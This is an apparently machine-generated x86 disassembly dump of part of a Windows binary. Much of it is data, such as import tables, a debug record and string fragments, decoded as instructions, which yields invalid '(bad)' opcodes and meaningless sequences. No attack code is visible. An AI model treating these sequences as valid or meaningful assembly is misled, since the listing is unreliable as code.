  413bb8:	fisttp WORD PTR [eax]
  413bba:	jmp    0x4875dc89
  413bbf:	(bad)
  413bc2:	fdiv   QWORD PTR [edi+0x4d]
  413bc5:	mov    ecx,0x4e27e364
  413bca:	mov    edx,0xd3e3cbb5
  413bcf:	call   ebp
  413bd1:	dec    edx
  413bd2:	iret   
  413bd3:	lods   al,BYTE PTR ds:[esi]
  413bd4:	fadd   DWORD PTR [ebx+0x2b]
  413bd7:	popf   
  413bd8:	xchg   ebp,eax
  413bd9:	test   al,0x8b
  413bdb:	retf   
  413bdc:	sar    DWORD PTR [ebp-0x71b5c0c5],1
  413be2:	imul   ecx,DWORD PTR [ebx-0x37cc07b3],0xffffff8b
  413be9:	inc    ebp
  413bea:	adc    BYTE PTR [ebx],al
  413bec:	into   
  413bed:	mov    DWORD PTR [eax],ecx
  413bef:	pop    edi
  413bf0:	pop    esi
  413bf1:	pop    ebx
  413bf2:	leave  
  413bf3:	ret    0xc
  413bf6:	jne    0x413c0b
  413bf8:	adc    BYTE PTR [eax],al
  413bfa:	std    
  413bfb:	push   ds
  413bfc:	adc    BYTE PTR [eax],al
  413bfe:	aas    
  413bff:	adc    BYTE PTR fs:[eax],al
  413c02:	sbb    cl,BYTE PTR [esi]
  413c04:	adc    BYTE PTR [eax],al
  413c06:	sbb    BYTE PTR [eax+0x10],dl
  413c09:	add    BYTE PTR [eax],ah
  413c0b:	push   es
  413c0c:	adc    BYTE PTR [eax],al
  413c0e:	out    dx,al
  413c0f:	jg     0x413c21
  413c11:	add    BYTE PTR [ebx],al
  413c13:	dec    edi
  413c14:	adc    BYTE PTR [eax],al
  413c16:	mov    esp,0x5500103b
  413c1b:	jns    0x413c2d
  413c1d:	add    BYTE PTR [edx],ch
  413c1f:	inc    eax
  413c20:	adc    BYTE PTR [eax],al
  413c22:	sbb    BYTE PTR ds:0x3d1c0041,bh
  413c28:	inc    ecx
  413c29:	add    BYTE PTR [eax],ah
  413c2b:	cmp    eax,0x3d240041
  413c30:	inc    ecx
  413c31:	add    BYTE PTR [eax],ch
  413c33:	cmp    eax,0x3d2c0041
  413c38:	inc    ecx
  413c39:	add    BYTE PTR [eax],dh
  413c3b:	cmp    eax,0x3d340041
  413c40:	inc    ecx
	...
  413c51:	add    BYTE PTR [eax],al
  413c53:	add    BYTE PTR [esi+0x4df185],bh
  413c59:	add    BYTE PTR [eax],al
  413c5b:	add    BYTE PTR [edx],al
  413c5d:	add    BYTE PTR [eax],al
  413c5f:	add    BYTE PTR [eax+0x0],dl
  413c62:	add    BYTE PTR [eax],al
  413c64:	inc    eax
  413c65:	cmp    eax,0x31400001
  413c6a:	add    DWORD PTR [eax],eax
  413c6c:	scas   al,BYTE PTR es:[edi]
  413c6d:	inc    ebp
  413c6e:	adc    BYTE PTR [eax],al
  413c70:	inc    esp
  413c71:	cmp    edx,DWORD PTR [eax]
  413c73:	add    BYTE PTR [edi+0x4e],bl
  413c76:	adc    BYTE PTR [eax],al
  413c78:	push   0x4b
  413c7a:	adc    BYTE PTR [eax],al
  413c7c:	cmp    edx,DWORD PTR fs:[eax]
  413c7f:	add    BYTE PTR [eax+0x43001057],bl
  413c85:	sbb    dl,BYTE PTR [eax]
  413c87:	add    BYTE PTR [esi+0x39],bl
  413c8a:	adc    BYTE PTR [eax],al
  413c8c:	idiv   BYTE PTR [ebx]
  413c8e:	inc    ecx
  413c8f:	add    dl,bh
  413c91:	cmp    eax,DWORD PTR [ecx+0x0]
  413c94:	(bad)  
  413c95:	cmp    eax,DWORD PTR [ecx+0x0]
  413c98:	add    bh,BYTE PTR [ecx+eax*2]
  413c9b:	add    BYTE PTR [esi],al
  413c9d:	cmp    al,0x41
  413c9f:	add    BYTE PTR [edx],cl
  413ca1:	cmp    al,0x41
  413ca3:	add    BYTE PTR [esi],cl
  413ca5:	cmp    al,0x41
  413ca7:	add    BYTE PTR [edx],dl
  413ca9:	cmp    al,0x41
  413cab:	add    BYTE PTR [esi],dl
  413cad:	cmp    al,0x41
  413caf:	add    BYTE PTR [edx],bl
  413cb1:	cmp    al,0x41
  413cb3:	add    BYTE PTR [esi],bl
  413cb5:	cmp    al,0x41
  413cb7:	add    al,bl
  413cb9:	cmp    al,0x41
  413cbb:	add    ah,bl
  413cbd:	cmp    al,0x41
  413cbf:	add    al,ah
  413cc1:	cmp    al,0x41
  413cc3:	add    ah,ah
  413cc5:	cmp    al,0x41
  413cc7:	add    al,ch
  413cc9:	cmp    al,0x41
  413ccb:	add    ah,ch
  413ccd:	cmp    al,0x41
  413ccf:	add    al,dh
  413cd1:	cmp    al,0x41
  413cd3:	add    ah,dh
  413cd5:	cmp    al,0x41
  413cd7:	add    BYTE PTR [ebp+0x16],ah
  413cda:	adc    BYTE PTR [eax],al
  413cdc:	sub    BYTE PTR [ecx+0x10],0x0
  413ce0:	cli    
  413ce1:	adc    BYTE PTR [bx+si],al
  413ce4:	sbb    BYTE PTR [ecx],al
  413ce6:	adc    BYTE PTR [eax],al
  413ce8:	pop    edi
  413ce9:	inc    esp
  413cea:	adc    BYTE PTR [eax],al
  413cec:	sbb    BYTE PTR [edx],ch
  413cee:	adc    BYTE PTR [eax],al
  413cf0:	in     eax,dx
  413cf1:	pop    ss
  413cf2:	adc    BYTE PTR [eax],al
  413cf4:	pop    esp
  413cf5:	sub    BYTE PTR [eax],dl
  413cf7:	add    BYTE PTR [esp+edi*1+0x41],ch
  413cfb:	add    BYTE PTR [eax+0x3c],dh
  413cfe:	inc    ecx
  413cff:	add    BYTE PTR [esp+edi*1+0x41],dh
  413d03:	add    BYTE PTR [eax+0x3c],bh
  413d06:	inc    ecx
  413d07:	add    BYTE PTR [esp+edi*1+0x41],bh
  413d0b:	add    BYTE PTR [eax-0x7bffbec4],al
  413d11:	cmp    al,0x41
  413d13:	add    BYTE PTR [eax-0x17ffbec4],cl
  413d19:	aaa    
  413d1a:	adc    BYTE PTR [eax],al
  413d1c:	cmp    DWORD PTR [esi],0x51e90010
  413d22:	adc    BYTE PTR [eax],al
  413d24:	push   cs
  413d25:	dec    eax
  413d26:	adc    BYTE PTR [eax],al
  413d28:	mov    ah,0x22
  413d2a:	adc    BYTE PTR [eax],al
  413d2c:	lock xor BYTE PTR [eax],dl
  413d2f:	add    BYTE PTR [edi+0x6b],ah
  413d32:	adc    BYTE PTR [eax],al
  413d34:	outs   dx,BYTE PTR ds:[esi]
  413d35:	or     eax,0x10
  413d3a:	add    BYTE PTR [eax],al
  413d3c:	add    BYTE PTR [eax],al
  413d3e:	add    BYTE PTR [eax],al
  413d40:	push   edx
  413d41:	push   ebx
  413d42:	inc    esp
  413d43:	push   ebx
  413d44:	push   ss
  413d45:	sbb    bh,BYTE PTR [ecx-0x2e]
  413d48:	test   al,0x5d
  413d4a:	pop    edx
  413d4b:	dec    eax
  413d4c:	cmp    DWORD PTR [esi],0xfffffff8
  413d4f:	mov    ss,WORD PTR [ecx-0x5a]
  413d52:	test   eax,0x10d
  413d57:	add    BYTE PTR [ebp+0x3a],al
  413d5a:	pop    esp
  413d5b:	dec    ecx
  413d5c:	outs   dx,BYTE PTR ds:[esi]
  413d5d:	jae    0x413dd3
  413d5f:	popa   
  413d60:	ins    BYTE PTR es:[edi],dx
  413d61:	ins    BYTE PTR es:[edi],dx
  413d62:	and    BYTE PTR [eax+0x61],dl
  413d65:	je     0x413dcf
  413d67:	pop    esp
  413d68:	push   ebx
  413d69:	outs   dx,BYTE PTR gs:[esi]
  413d6b:	fs push ebx
  413d6d:	dec    ebp
  413d6e:	push   ebx
  413d6f:	pop    esp
  413d70:	dec    ebp
  413d71:	popa   
  413d72:	imul   ebp,DWORD PTR [esi+0x5c],0x46627553
  413d79:	outs   dx,DWORD PTR ds:[esi]
  413d7a:	ins    BYTE PTR es:[edi],dx
  413d7b:	fs gs jb 0x413ddb
  413d7f:	dec    ecx
  413d80:	outs   dx,BYTE PTR ds:[esi]
  413d81:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413d85:	gs jae 0x413de4
  413d88:	dec    ecx
  413d89:	outs   dx,BYTE PTR ds:[esi]
  413d8a:	outs   dx,WORD PTR ds:[esi]
  413d8c:	inc    ecx
  413d8d:	jo     0x413dff
  413d8f:	add    BYTE PTR [eax],al
  413d91:	add    BYTE PTR [eax],al
  413d93:	add    BYTE PTR [esi+0x4df185],bh
  413d99:	add    BYTE PTR [eax],al
  413d9b:	add    dl,al
  413d9d:	cmp    eax,0x10001
  413da2:	add    BYTE PTR [eax],al
  413da4:	add    DWORD PTR [eax],eax
  413da6:	add    BYTE PTR [eax],al
  413da8:	add    DWORD PTR [eax],eax
  413daa:	add    BYTE PTR [eax],al
  413dac:	mov    eax,0xbc00013d
  413db1:	cmp    eax,0x3dc00001
  413db6:	add    DWORD PTR [eax],eax
  413db8:	mov    ds:0xce000026,al
  413dbd:	cmp    eax,0x1
  413dc2:	push   ebx
  413dc3:	jns    0x413e32
  413dc5:	bound  ebp,QWORD PTR [edi+0x6c]
  413dc8:	imul   esp,DWORD PTR [ebx+0x45],0x3f006578
  413dcf:	inc    ebx
  413dd0:	ins    BYTE PTR es:[edi],dx
  413dd1:	outs   dx,DWORD PTR ds:[esi]
  413dd2:	jae    0x413e39
  413dd4:	push   edi
  413dd5:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  413ddc:	popa   
  413ddd:	je     0x413e48
  413ddf:	outs   dx,DWORD PTR ds:[esi]
  413de0:	outs   dx,BYTE PTR ds:[esi]
  413de1:	inc    ebx
  413de2:	ins    BYTE PTR es:[edi],dx
  413de3:	outs   dx,DWORD PTR ds:[esi]
  413de4:	jae    0x413e4b
  413de6:	push   edi
  413de7:	.byte 0x69
